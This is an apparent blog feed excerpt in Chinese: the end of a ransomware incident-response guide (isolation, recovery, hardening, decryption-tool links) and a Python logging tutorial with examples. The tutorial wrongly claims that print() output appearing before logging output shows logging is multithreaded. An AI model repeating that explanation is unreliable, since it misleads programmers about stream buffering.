title="2、抑制阶段"></a>2、抑制阶段</h3>发现勒索病毒后如何进行隔离：</li></ol><ul><li>采取可行措施进行隔离，避免影响其它主机（如断网隔离）</li><li>通过边界控制设备，防止网络区域间相互影响</li></ul><p>防止勒索病毒扩散：</p><ul><li>采取及时的补救加固措施（安全加固）</li><li>相关漏洞的扫描修补与跟踪</li><li>配置核查<h3 id="3、处置阶段"><a href="#3、处置阶段" class="headerlink" title="3、处置阶段"></a>3、处置阶段</h3>信息收集：</li><li>IT管理人员截图取证主机中的勒索信息文件</li><li>截图取证被加密的时间和文件后缀名</li><li>检查服务器开放端口情况、补丁更新情况，并截图取证</li><li>检查服务器当日的安全日志，截图取证或导出当天日志<h3 id="4、-恢复阶段"><a href="#4、-恢复阶段" class="headerlink" title="4、 恢复阶段"></a>4、 恢复阶段</h3>业务恢复：</li><li>从备份中恢复损坏的数据 </li><li>调整可能影响业务正常运转的策略</li></ul><p>文件解密：</p><ul><li>付费风险：部分中招主机可能包含关键信息，企业处于业务考虑可能会考虑通过比特币付款，但不能确认付款可以恢复数据，建议企业慎重考虑。</li><li>解密工具：可查看安全厂商已发布部分勒索病毒的解密工具。<h3 id="5、安全加固"><a href="#5、安全加固" class="headerlink" title="5、安全加固"></a>5、安全加固</h3>通常应从如下方面进行加固：</li><li>多数勒索软件会利用RDP(远程桌面协议)暴力破解传播，在不影响业务的前提下避免3389端口对外开放。利用IPS、防火墙等设备对3389端口进行防护</li><li>开启windows自身的防火墙尽量关闭3389、445、139、135等不用的高危端口</li><li>在计算机中配置账户锁定策略，连续登陆失败即锁定账户</li><li>要求每台服务器设置唯一口令，且禁止设置弱口令（复杂度要求采用大小写字母、数字、特殊符号混合）</li><li>对员工进行安全意识培训，避免打开陌生邮件的附件、下载破解版软件和运行来源不明的程序</li><li>定时对重要数据进行异地备份，防止数据破坏和丢失</li><li>及时更新系统及应用版本，及时打漏洞补丁</li><li>及时安装防病毒软件，并更新到最新的病毒库和引擎</li><li>定时通过扫描器做专项口令排查，可排查通用口令和弱口令</li></ul><h2 id="部分公开的勒索相关解密工具"><a href="#部分公开的勒索相关解密工具" class="headerlink" title="部分公开的勒索相关解密工具"></a>部分公开的勒索相关解密工具</h2><p>公开的勒索病毒相关解密工具（Free Ransomware Decryption Tools），可供应急查询使用：<br>1、kaspersky<br>Free Ransomware Decryptors - Kaspersky Lab <a href="https://noransom.kaspersky.com/" target="_blank" rel="noopener">https://noransom.kaspersky.com/</a><br>2、avast<br>Free Ransomware Decryption Tools | Unlock Your Files | Avast<br><a href="https://www.avast.com/ransomware-decryption-tools" target="_blank" rel="noopener">https://www.avast.com/ransomware-decryption-tools</a><br>3、avg<br>Free Ransomware Decryption Tools | Unlock Your Files | AVG<br><a href="https://www.avg.com/en-us/ransomware-decryption-tools" target="_blank" rel="noopener">https://www.avg.com/en-us/ransomware-decryption-tools</a><br>4、No More Ransom<br>The No More Ransom Project<br><a href="https://www.nomoreransom.org/en/decryption-tools.html" target="_blank" rel="noopener">https://www.nomoreransom.org/en/decryption-tools.html</a><br>5、Bitdefender<br>Free Tools – Bitdefender Labs<br><a href="https://labs.bitdefender.com/category/free-tools/" target="_blank" rel="noopener">https://labs.bitdefender.com/category/free-tools/</a><br>6、MalwareHunter<br>ID Ransomware<br><a href="https://id-ransomware.malwarehunterteam.com/index.php" target="_blank" rel="noopener">https://id-ransomware.malwarehunterteam.com/index.php</a><br>7、McAfee<br>McAfee Ransomware Recover (Mr2) | McAfee Free Tools<br><a href="https://www.mcafee.com/enterprise/en-us/downloads/free-tools/ransomware-decryption.html" target="_blank" rel="noopener">https://www.mcafee.com/enterprise/en-us/downloads/free-tools/ransomware-decryption.html</a><br>8、 Trend Micro<br>Using the Trend Micro Ransomware File Decryptor Tool<br><a href="https://success.trendmicro.com/portal_kb_articledetail?solutionid=1114221" target="_blank" rel="noopener">https://success.trendmicro.com/portal_kb_articledetail?solutionid=1114221</a></p><hr><p>博客文章：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230323/%E5%8B%92%E7%B4%A2%E7%97%85%E6%AF%92.png&quot; alt=&quot;勒索病毒&quot;&gt;&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="技术" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/"/>
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/categories/%E6%8A%80%E6%9C%AF/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="网络安全" scheme="https://xiejava.gitee.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>Python日志logging实战教程</title>
    <link href="https://xiejava.gitee.io/posts/c24f493c/"/>
    <id>https://xiejava.gitee.io/posts/c24f493c/</id>
    <published>2023-03-19T06:21:31.000Z</published>
    <updated>2023-03-19T06:52:17.886Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、什么是日志"><a href="#一、什么是日志" class="headerlink" title="一、什么是日志"></a>一、什么是日志</h2><p>在<a href="http://xiejava.ishareread.com/posts/6a8b36cb/" target="_blank" rel="noopener">《网络安全之认识日志采集分析审计系统》</a>中我们认识了日志。日志数据的核心就是日志消息或日志，日志消息是计算机系统、设备、软件等在某种刺激下反应生成的东西。</p><p>日志数据（log data）就是一条日志消息的内在含义，用来告诉你为什么生成日志消息的信息。日志（log）指用于展示某些事件全貌的日志消息的集合。</p><h2 id="二、为什么要写日志"><a href="#二、为什么要写日志" class="headerlink" title="二、为什么要写日志"></a>二、为什么要写日志</h2><p>日志是对软件执行时所发生事件的一种追踪方式。软件开发人员对他们的代码添加日志调用，借此来指示某事件的发生。一个事件通过一些包含变量数据的描述信息来描述。对于软件系统来说，健全的日志记录是程序调试、故障定位、事件追溯的有效手段。</p><p>日志通用的几种类型：</p><ul><li>信息（Info）:告诉用户和管理员发生了一些没有风险的事情。</li><li>调试（Debug）:在应用程序代码运行时生成调试信息，给软件开发人员提供故障检测和定位问题的帮助。</li><li>警告（Warning）:缺少需要的文件、参数、数据，但又不影响系统运行时生成警告。</li><li>错误（Error）:传达在计算机系统重出现的各种级别的错误。许多错误消息只能给出为什么出错的起点，要寻找出导致错误发生的根本原因还需要进一步的调查。</li></ul><h2 id="三、Python日志logging模块实战"><a href="#三、Python日志logging模块实战" class="headerlink" title="三、Python日志logging模块实战"></a>三、Python日志logging模块实战</h2><p>在进行Python程序开发时，Python提供了logging模块，能够很好的帮助开发人员很方便的的记录日志信息。</p><p>对于简单的日志使用来说日志功能提供了一系列便利的函数。它们是 debug()，info()，warning()，error() 和 critical()。想要决定何时使用日志，请看下表，其中显示了对于每个通用任务集合来说最好的工具。</p><table><thead><tr><th>你想要执行的任务</th><th>此任务的最好的工具</th></tr></thead><tbody><tr><td>对于命令行或程序的应用，结果显示在控制台。</td><td>print()</td></tr><tr><td>在对程序的普通操作发生时提交事件报告(比如：状态监控和错误调查)</td><td>logging.info() 函数(当有诊断目的需要详细输出信息时使用 logging.debug() 函数)</td></tr><tr><td>提出一个警告信息基于一个特殊的运行时事件</td><td>warnings.warn() 位于代码库中，该事件是可以避免的，需要修改客户端应用以消除告警logging.warning() 不需要修改客户端应用，但是该事件还是需要引起关注</td></tr><tr><td>对一个特殊的运行时事件报告错误</td><td>引发异常</td></tr><tr><td>报告错误而不引发异常(如在长时间运行中的服务端进程的错误处理)</td><td>logging.error(), logging.exception() 或 logging.critical() 分别适用于特定的错误及应用领域</td></tr></tbody></table><p>日志功能应以所追踪事件级别或严重性而定。各级别适用性如下（以严重性递增）：</p><table><thead><tr><th>级别</th><th>何时使用</th></tr></thead><tbody><tr><td>DEBUG</td><td>细节信息，仅当诊断问题时适用。</td></tr><tr><td>INFO</td><td>确认程序按预期运行。</td></tr><tr><td>WARNING</td><td>表明有已经或即将发生的意外（例如：磁盘空间不足）。程序仍按预期进行。</td></tr><tr><td>ERROR</td><td>由于严重的问题，程序的某些功能已经不能正常执行</td></tr><tr><td>CRITICAL</td><td>严重的错误，表明程序已不能继续执行</td></tr></tbody></table><p>默认的级别是 WARNING，意味着只会追踪该级别及以上的事件，除非更改日志配置。</p><p>所追踪事件可以以不同形式处理。最简单的方式是输出到控制台。另一种常用的方式是写入磁盘文件。</p><p>Python的logging库采用模块化方法，并提供了几类组件：记录器，处理程序，过滤器和格式化程序。</p><ul><li>记录器（Logger）：提供应用程序代码直接使用的接口。 </li><li>处理器（Handler）：将日志记录（由记录器创建）发送到适当的目的地。</li><li>筛选器（Filter）：提供了更细粒度的功能，用于确定要输出的日志记录。 </li><li>格式器（Formatter）：程序在最终输出日志记录的内容格式。</li></ul><p>logging的工作流程：以记录器Logger为对象，设置合适的处理器Handler，辅助以筛选器Filter、格式器Formatter，设置日志级别以及常用的方法，最终输出理想的日志记录给到指定目标<br>一个Logger可以包含多个Handler；<br>每个Handler可以设置自己的Filter和Formatter；<br>记录器和处理器中的日志事件信息流程如下图所示：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/1_logging%E6%B5%81%E7%A8%8B.png" alt="日志事件信息流程"></p><p>接下来我们通过几个简单的应用场景来进行日志记录实战</p><h3 id="1、最简单的日志记录"><a href="#1、最简单的日志记录" class="headerlink" title="1、最简单的日志记录"></a>1、最简单的日志记录</h3><p><strong>main.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logging.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logging.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logging.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logging.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logging.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br></pre></td></tr></table></figure><p>结果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/2_%E6%9C%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E7%BB%93%E6%9E%9C.png" alt="最简单的日志记录结果"></p><p>这里体现了两个问题：<br>1.通过print()在控制台打印的日志，比logging打印的日志提前打印显示，说明日志记录是多线程的。在平时日志调试跟踪的时候注意这一点，print()的信息有时会打印在logging前有时会在logging后。</p><p>2.debug和info的日志没有打印出来，说明logging默认的日志级别是waring。<br>如果要设置改变默认的日志级别可以通过配置来设置日志级别如：level=logging.DEBUG</p><h3 id="2、设置日志级别"><a href="#2、设置日志级别" class="headerlink" title="2、设置日志级别"></a>2、设置日志级别</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line">logging.basicConfig(level=logging.DEBUG) <span class="comment">#设置日志级别</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logging.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logging.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logging.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logging.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logging.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/3_%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E7%BA%A7%E5%88%AB%E7%9A%84%E7%BB%93%E6%9E%9C.png" alt="设置日志级别结果"></p><p>这下从DEBUG到CRITICAL级别的都打印出来了。</p><h3 id="3、设置日志显示格式"><a href="#3、设置日志显示格式" class="headerlink" title="3、设置日志显示格式"></a>3、设置日志显示格式</h3><p>默认的日志打印显示的格式是， 日志级别：logger实例名称（默认是root）：日志消息内容<br>如这里显示的是：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DEBUG:root:this is print_hi debug</span><br><span class="line">INFO:root:this is print_hi info</span><br><span class="line">WARNING:root:this is print_hi warning</span><br><span class="line">ERROR:root:this is print_hi error</span><br><span class="line">CRITICAL:root:this is print_hi critical</span><br></pre></td></tr></table></figure><p>在真实使用的场景下，一般都要显示日志的时间，我们可以通过设置日志显示格式来调整我们需要显示的日志格式和内容。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG)</span><br></pre></td></tr></table></figure><p>这里设置了日志发生时间、日志级别、logger实例名称、日志发生的文件名、日志发生所在的行、日志消息内容。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/4_%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E6%A0%BC%E5%BC%8F.png" alt="设置日志格式"></p><p>更多的logRecord属性如下：</p><table><thead><tr><th>属性名称</th><th>格式</th><th>描述</th></tr></thead><tbody><tr><td>args</td><td>此属性不需要用户进行格式化。</td><td>合并到 msg 以产生 message 的包含参数的元组，或是其中的值将被用于合并的字典（当只有一个参数且其类型为字典时）。</td></tr><tr><td>asctime</td><td>%(asctime)s</td><td>表示 LogRecord 何时被创建的供人查看时间值。 默认形式为 ‘2003-07-08 16:49:45,896’ （逗号之后的数字为时间的毫秒部分）。</td></tr><tr><td>created</td><td>%(created)f</td><td>LogRecord 被创建的时间（即 time.time() 的返回值）。</td></tr><tr><td>exc_info</td><td>此属性不需要用户进行格式化。</td><td>异常元组（例如 sys.exc_info）或者如未发生异常则为 None。</td></tr><tr><td>filename</td><td>%(filename)s</td><td>pathname 的文件名部分。</td></tr><tr><td>funcName</td><td>%(funcName)s</td><td>函数名包括调用日志记录。</td></tr><tr><td>levelname</td><td>%(levelname)s</td><td>消息文本记录级别（’DEBUG’，’INFO’，’WARNING’，’ERROR’，’CRITICAL’）</td></tr><tr><td>levelno</td><td>%(levelno)s</td><td>消息数字的记录级别 (DEBUG, INFO, WARNING, ERROR, CRITICAL)</td></tr><tr><td>lineno</td><td>%(lineno)d</td><td>发出日志记录调用所在的源行号（如果可用）。</td></tr><tr><td>message</td><td>%(message)s</td><td>记入日志的消息，即 msg % args 的结果。 这是在发起调用 Formatter.format() 时设置的。</td></tr><tr><td>module</td><td>%(module)s</td><td>模块 (filename 的名称部分)。</td></tr><tr><td>msecs</td><td>%(msecs)d</td><td>LogRecord 被创建的时间的毫秒部分。</td></tr><tr><td>msg</td><td>此属性不需要用户进行格式化。</td><td>在原始日志记录调用中传入的格式字符串。 与 args 合并以产生 message，或是一个任意对象 (参见 使用任意对象作为消息)。</td></tr><tr><td>name</td><td>%(name)s</td><td>用于记录调用的日志记录器名称。</td></tr><tr><td>pathname</td><td>%(pathname)s</td><td>发出日志记录调用的源文件的完整路径名（如果可用）。</td></tr><tr><td>process</td><td>%(process)d</td><td>进程ID（如果可用）</td></tr><tr><td>processName</td><td>%(processName)s</td><td>进程名（如果可用）</td></tr><tr><td>relativeCreated</td><td>%(relativeCreated)d</td><td>以毫秒数表示的 LogRecord 被创建的时间，即相对于 logging 模块被加载时间的差值。</td></tr><tr><td>stack_info</td><td>此属性不需要用户进行格式化。</td><td>当前线程中从堆栈底部起向上直到包括日志记录调用并引发创建当前记录堆栈帧创建的堆栈帧信息（如果可用）。</td></tr><tr><td>thread</td><td>%(thread)d</td><td>线程ID（如果可用）</td></tr><tr><td>threadName</td><td>%(threadName)s</td><td>线程名（如果可用）</td></tr></tbody></table><h3 id="4、记录日志到日志文件"><a href="#4、记录日志到日志文件" class="headerlink" title="4、记录日志到日志文件"></a>4、记录日志到日志文件</h3><p>logging默认是显示在控制台，在真实生产环境肯定时需要将日志记录到日志文件的。logging也是可以通过配置很方便的将日志记录到日志文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">logging.basicConfig(filename=<span class="string">'log.log'</span>,format=LOG_FORMAT,level=logging.DEBUG)</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/5_%E6%97%A5%E5%BF%97%E6%89%93%E5%8D%B0%E5%88%B0%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.png" alt="输出到日志文件中"><br>输出到日志文件<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/6_%E8%BE%93%E5%87%BA%E5%88%B0%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E6%95%88%E6%9E%9C.png" alt="输出到日志文件效果"><br>将日志输出到日志文件，如果是日志量非常大，在实际生产环境经常碰到的是要对日志文件进行分隔，根据日志文件的大小或日期来分割生成多个日志文件。<br>这里介绍通过日志文件大小分割和通过日期来分割日志文件。</p><h4 id="1-通过日志文件大小分割"><a href="#1-通过日志文件大小分割" class="headerlink" title="1.通过日志文件大小分割"></a>1.通过日志文件大小分割</h4><p>RotatingFileHandler<br>日志记录到文件中，且支持指定日志文件大小，备份文件数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.handlers.RotatingFileHandler(filename, mode=<span class="string">'a'</span>, maxBytes=<span class="number">0</span>, backupCount=<span class="number">0</span>, encoding=<span class="literal">None</span>, delay=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><p>maxBytes：日志文件大小，单位为字节<br>backupCount：备份文件数量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">rfh=logging.handlers.RotatingFileHandler(filename=<span class="string">'log.log'</span>,encoding=<span class="string">'UTF-8'</span>, maxBytes=<span class="number">1024</span>, backupCount=<span class="number">2</span>)</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh])</span><br></pre></td></tr></table></figure><p>这里设置的是当文件超过1024bytes就会对文件进行分割，备份文件数量为2，得到log.log.1、log.log.2，当log.log.2写满时又回循环写到log.log中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/7_%E6%A0%B9%E6%8D%AE%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%A4%A7%E5%B0%8F%E5%BE%AA%E7%8E%AF%E5%88%87%E5%89%B2%E7%94%9F%E6%88%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.png" alt="根据日志文件大小循环切割生成日志文件"></p><h4 id="2-通过日期来分割日志文件"><a href="#2-通过日期来分割日志文件" class="headerlink" title="2.通过日期来分割日志文件"></a>2.通过日期来分割日志文件</h4><p>TimedRotatingFileHandler<br>日志记录到文件中，支持按时间间隔来更新日志</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">logging.handlers.TimedRotatingFileHandler(filename, when=<span class="string">'h'</span>, interval=<span class="number">1</span>, backupCount=<span class="number">0</span>, encoding=<span class="literal">None</span>, delay=<span class="literal">False</span>, utc=<span class="literal">False</span>, atTime=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure><p>指定的文件会被打开并用作日志记录的流。 对于轮换操作它还会设置文件名前缀。 轮换的发生是基于 when 和 interval 的积。<br>你可以使用 when 来指定 interval 的类型。 可能的值列表如下。 请注意它们不是大小写敏感的。</p><table><thead><tr><th>值</th><th>间隔类型</th><th>如果/如何使用 atTime</th></tr></thead><tbody><tr><td>‘S’</td><td>秒</td><td>忽略</td></tr><tr><td>‘M’</td><td>分钟</td><td>忽略</td></tr><tr><td>‘H’</td><td>小时</td><td>忽略</td></tr><tr><td>‘D’</td><td>天</td><td>忽略</td></tr><tr><td>‘W0’-‘W6’</td><td>工作日(0=星期一)</td><td>用于计算初始轮换时间</td></tr><tr><td>‘midnight’</td><td>如果未指定 atTime 则在午夜执行轮换，否则将使用 atTime。</td><td>用于计算初始轮换时间</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> RotatingFileHandler</span><br><span class="line"></span><br><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">tfh=logging.handlers.TimedRotatingFileHandler(<span class="string">'tfh_log.log'</span>, when=<span class="string">'S'</span>, interval=<span class="number">1.5</span>, backupCount=<span class="number">2</span>, encoding=<span class="string">'UTF-8'</span>, delay=<span class="literal">False</span>, utc=<span class="literal">False</span>, atTime=time)</span><br><span class="line">rfh=logging.handlers.RotatingFileHandler(filename=<span class="string">'log.log'</span>,encoding=<span class="string">'UTF-8'</span>, maxBytes=<span class="number">1024</span>, backupCount=<span class="number">2</span>)</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh,tfh])</span><br></pre></td></tr></table></figure><p>为了演示方便，这里when=’S’, interval=1.5 即1.5秒循环生成一个日志文件。在实际生产环境一般根据日志量的大小，可以配置成每天生成一个日志文件。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/8_%E6%A0%B9%E6%8D%AE%E6%97%A5%E6%9C%9F%E5%88%87%E5%89%B2%E7%94%9F%E6%88%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6.png" alt="通过日期来分割日志文件"></p><h3 id="5、既生成日志文件又在控制台打印日志"><a href="#5、既生成日志文件又在控制台打印日志" class="headerlink" title="5、既生成日志文件又在控制台打印日志"></a>5、既生成日志文件又在控制台打印日志</h3><p>有时候为了调试方便，还是想在控制台打印日志。能不能既生成日志文件又在控制台打印日志呢？通过配置logging的StreamHandler也是可以做到的。<br>StreamHandler<br>StreamHandler 类位于核心 logging 包，它可将日志记录输出发送到数据流例如 sys.stdout, sys.stderr 或任何文件类对象（或者更精确地说，任何支持 write() 和 flush() 方法的对象）。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sh=logging.StreamHandler()</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh,tfh,sh])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/9_%E6%97%A2%E7%94%9F%E6%88%90%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%E5%8F%88%E5%9C%A8%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%89%93%E5%8D%B0%E6%97%A5%E5%BF%97.png" alt="既生成日志文件又在控制台打印日志"></p><h3 id="6、多个模块中记录日志"><a href="#6、多个模块中记录日志" class="headerlink" title="6、多个模块中记录日志"></a>6、多个模块中记录日志</h3><p>在实际项目使用过程中，一个好的实践是将日志配置的模块封装好成为一个通用的日志模块组件，可以给项目中所有的模块使用。<br>这里我们将配置好的日志logging从main.py中抽出来形成一个logutils.py的通用模块，其他模块就可以使用了<br><strong>logutils.py</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> logging.handlers <span class="keyword">import</span> RotatingFileHandler</span><br><span class="line"></span><br><span class="line">LOG_FORMAT = <span class="string">"%(asctime)s - %(levelname)s %(name)s %(filename)s [line:%(lineno)d] - %(message)s"</span></span><br><span class="line">tfh=logging.handlers.TimedRotatingFileHandler(<span class="string">'tfh_log.log'</span>, when=<span class="string">'S'</span>, interval=<span class="number">1.5</span>, backupCount=<span class="number">2</span>, encoding=<span class="string">'UTF-8'</span>, delay=<span class="literal">False</span>, utc=<span class="literal">False</span>, atTime=time)</span><br><span class="line">rfh=logging.handlers.RotatingFileHandler(filename=<span class="string">'log.log'</span>,encoding=<span class="string">'UTF-8'</span>, maxBytes=<span class="number">1024</span>, backupCount=<span class="number">2</span>)</span><br><span class="line">sh=logging.StreamHandler()</span><br><span class="line">logging.basicConfig(format=LOG_FORMAT,level=logging.DEBUG,handlers=[rfh,tfh,sh])</span><br></pre></td></tr></table></figure><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2023/20230319/10_logutils.png" alt="公共日志模块"></p><p>如在othermodule.py中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TestModule</span><span class="params">()</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log</span><span class="params">(self)</span>:</span></span><br><span class="line">        logging.info(<span class="string">'this is TestModule.print_log() info'</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">print_log_staic</span><span class="params">()</span>:</span></span><br><span class="line">        logging.info(<span class="string">'this is TestModule.print_log_staic info'</span>)</span><br></pre></td></tr></table></figure><p>在main.py中使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> logutils <span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> othermodule <span class="keyword">import</span> TestModule</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_hi</span><span class="params">(name)</span>:</span></span><br><span class="line">    logging.debug(<span class="string">'this is print_hi debug'</span>)</span><br><span class="line">    logging.info(<span class="string">'this is print_hi info'</span>)</span><br><span class="line">    logging.warning(<span class="string">'this is print_hi warning'</span>)</span><br><span class="line">    logging.error(<span class="string">'this is print_hi error'</span>)</span><br><span class="line">    logging.critical(<span class="string">'this is print_hi critical'</span>)</span><br><span class="line">    print(<span class="string">f'Hi print_hi, <span class="subst">&#123;name&#125;</span>'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print_hi(<span class="string">'XieJava'</span>)</span><br><span class="line">    TestModule.print_log_staic() <span 